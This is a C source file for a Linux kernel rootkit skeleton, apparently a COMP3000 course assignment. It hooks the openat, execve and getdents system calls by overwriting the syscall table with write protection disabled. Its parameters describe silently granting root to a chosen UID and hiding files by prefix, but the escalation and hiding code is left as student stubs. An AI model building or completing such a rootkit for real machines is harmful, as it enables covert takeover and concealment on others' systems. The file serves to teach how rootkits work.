/*
 * 3000rootkit
 * This skeleton has been adapted for COMP3000 by William Findlay.
 * Original skeleton written by Legion.
 */

#include "3000rootkit.h"

/* Location of the system call table in memory. */
static void **sys_call_table;

/* Doubly linked list to keep track of what hooks we have in place. */
static syscall_hook_list_t *hooks;

static int student_uid;
module_param(student_uid, int, 0);
MODULE_PARM_DESC(student_uid, "UID to silently give root privileges");

static char* magic_prefix;
module_param(magic_prefix, charp, 0);
MODULE_PARM_DESC(magic_prefix, "Files that start with this prefix are removed from the dirent buffer");

void enable_write_protection(void) {
  write_cr0(read_cr0() | 0x10000);
  return;
}

void disable_write_protection(void) {
  write_cr0(read_cr0() & (~ 0x10000));
  return;
}

/* Hook a systemcall and save the original function for later */
int hook_syscall(syscall_hook_t *hook)
{
    if(hook->hooked)
        return 0;

    /* Get & store the original syscall from the syscall_table using the offset */
    hook->orig_func = sys_call_table[hook->offset];

    printk(KERN_INFO "Hooking offset %d. Original: %lx to New:  %lx\n",
            hook->offset, (unsigned long) hook->orig_func, (unsigned long) hook->hook_func);

    /* Set protection to RW */
    disable_write_protection();

    /* Load the hook into syscall table memory */
    sys_call_table[hook->offset] = hook->hook_func;

    /* Set protection back to normal */
    enable_write_protection();

    /* Remember that we enabled the hook */
    hook->hooked = true;
    return hook->hooked;
}

/* Unhooks a syscall by restoring the original function. */
int unhook_syscall(syscall_hook_t *hook)
{
    if(!hook->hooked)
        return 0;

    printk(KERN_INFO "Unhooking offset %d back to  %lx\n",
            hook->offset, (unsigned long) hook->orig_func);

    /* Set protection to RW */
    disable_write_protection();

    /* Change things back to normal */
    sys_call_table[hook->offset] = hook->orig_func;

    /* Set protection back to normal */
    enable_write_protection();

    /* Remember we've undone the hook */
    hook->hooked = false;
    return !hook->hooked;
}

/* Finds the syscall_hook_t in our hook linked list that is hooking the given offset. */
syscall_hook_t *find_syscall_hook(const unsigned int offset)
{
    struct list_head      *element;
    syscall_hook_list_t   *hook_entry;
    syscall_hook_t        *hook;

    list_for_each(element, &(hooks->list))
    {
        hook_entry = list_entry(element, syscall_hook_list_t, list);
        hook       = hook_entry->hook;

        if(hook->offset == offset)
            return hook;
    }

    return 0;
}

/* Allocate a new system call hook and add it to our linked list. */
syscall_hook_t *new_hook(const unsigned int offset, void *newFunc)
{
    syscall_hook_t      *hook;
    syscall_hook_list_t *new_link;

    hook = kmalloc(sizeof(syscall_hook_t), GFP_KERNEL);
    hook->hooked         = false;
    hook->orig_func      = NULL;
    hook->hook_func      = newFunc;
    hook->offset         = offset;

    new_link = kmalloc(sizeof(syscall_hook_list_t), GFP_KERNEL);
    new_link->hook = hook;

    list_add(&(new_link->list), &(hooks->list));

    return new_link->hook;
}

int init_module(void)
{
    printk(KERN_INFO "3000rootkit module initalizing.\n");

    printk(KERN_INFO "The magic prefix is %s\n", magic_prefix);

    /* Allocate & init a list to store our syscall_hooks */
    hooks = kmalloc(sizeof(syscall_hook_list_t), GFP_KERNEL);
    INIT_LIST_HEAD(&(hooks->list));

    /* Yoink the sys_call_table */
    sys_call_table = (void *) kallsyms_lookup_name("sys_call_table");
    printk(KERN_INFO "Syscall table loaded from %lx\n", (unsigned long) sys_call_table);

    /* Example hook for openat */
    hook_syscall(new_hook(__NR_openat, (void*) &new_openat));
    /* Your execve hook */
    hook_syscall(new_hook(__NR_execve, (void*) &new_execve));
    /* Your getdents hook */
    hook_syscall(new_hook(__NR_getdents, (void*) &new_getdents));


    printk(KERN_INFO "3000rootkit module is loaded!\n");
    return 0;
}

/*
 * Module destructor callback
 */
void cleanup_module(void)
{
    struct list_head      *element;
    struct list_head      *tmp;
    syscall_hook_list_t   *hook_entry;
    syscall_hook_t        *hook;

    printk(KERN_INFO "3000rootkit module unloaded\n");

    /* Clean up our linked list */
    list_for_each_safe(element, tmp, &(hooks->list))
    {
        hook_entry = list_entry(element, syscall_hook_list_t, list);
        hook       = hook_entry->hook;

        printk(KERN_INFO "Freeing hook - offset %d\n", hook->offset);

        if(hook->hooked)
            unhook_syscall(hook_entry->hook);

        list_del(element);
        kfree(hook_entry);
    }

    printk(KERN_INFO "3000rootkit module cleanup complete\n");
}

asmlinkage int new_openat(int dirfd, const char *pathname, int flags, mode_t mode)
{
    char *k_path;
    /* Declare a orig_func function pointer with the types matched to open() */
    int (*orig_func)(int dirfd, const char *pathname, int flags, mode_t mode);
    syscall_hook_t *openat_hook;

    /* Find the syscall_hook_t for __NR_openat from our linked list */
    openat_hook = find_syscall_hook(__NR_openat);
    /* And cast the orig_func void pointer into the orig_func to be invoked */
    orig_func = (void*) openat_hook->orig_func;

    /* Comment this to stop the spammy print every time openat is called */
    k_path = kmalloc(PATH_MAX, GFP_KERNEL);
    strncpy_from_user(k_path, pathname, PATH_MAX);
    /* Only print openat calls to files in /lib or things can get out of hand quite quickly... */
    if(!strncmp(k_path, "/lib", strlen("/lib")))
        printk(KERN_INFO "I hooked openat(%d, %s, %x, %d)\n", dirfd, k_path, flags, mode);
    kfree(k_path);

    /* Invoke the original syscall */
    return (*orig_func)(dirfd, pathname, flags, mode);
}

asmlinkage int new_execve(const char *filename, char *const argv[], char *const envp[])
{
    /* Declare a orig_func function pointer with the types matched to execve() */
    int (*orig_func)(const char *filename, char *const argv[], char *const envp[]);
    syscall_hook_t *execve_hook;

    struct user_namespace *ns = current_user_ns();

    struct cred *cred;
    kuid_t root_uid = make_kuid(ns, 0);
    kgid_t root_gid = make_kgid(ns, 0);
    kuid_t student = make_kuid(ns, student_uid);
    kuid_t euid = current_euid();

    /* Find the syscall_hook_t for __NR_execve from our linked list */
    execve_hook = find_syscall_hook(__NR_execve);
    /* And cast the orig_func void pointer into the orig_func to be invoked */
    orig_func = (void*) execve_hook->orig_func;

    /* Your code here! */

    /* Invoke the original syscall */
    return (*orig_func)(filename, argv, envp);
}

asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
    char *k_dirp;
    struct linux_dirent *d;
    unsigned int bpos = 0;
    unsigned int retval = 0;
    /* Declare a orig_func function pointer with the types matched to getdents() */
    int (*orig_func)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
    syscall_hook_t *getdents_hook;

    /* Find the syscall_hook_t for __NR_getdents from our linked list */
    getdents_hook = find_syscall_hook(__NR_getdents);
    /* And cast the orig_func void pointer into the orig_func to be invoked */
    orig_func = (void*) getdents_hook->orig_func;

    /* Invoke the original syscall to populate dirp buffer
     * retval will contain the number of bytes read, so we can use it to kmalloc */
    retval = (*orig_func)(fd, dirp, count);

    if (!dirp || retval <= 0)
        goto end;

    /* Allocate k_dirp */
    k_dirp = kmalloc(retval, GFP_KERNEL);

    /* Copy memory from userspace */
    if (raw_copy_from_user(k_dirp, dirp, retval))
    {
        /* We somehow didn't copy the entire thing */
        printk(KERN_ALERT "Couldn't copy all dirents from userspace\n");
        kfree(k_dirp);
        return -EFAULT;
    }

    /* Your code here! */

    /* Copy memory back to userspace */
    if (raw_copy_to_user(dirp, k_dirp, retval))
    {
        /* We somehow didn't copy the entire thing */
        printk(KERN_ALERT "Couldn't copy all dirents to userspace\n");
        kfree(k_dirp);
        return -EFAULT;
    }

    /* Clean up memory */
    kfree(k_dirp);

end:
    return retval;
}
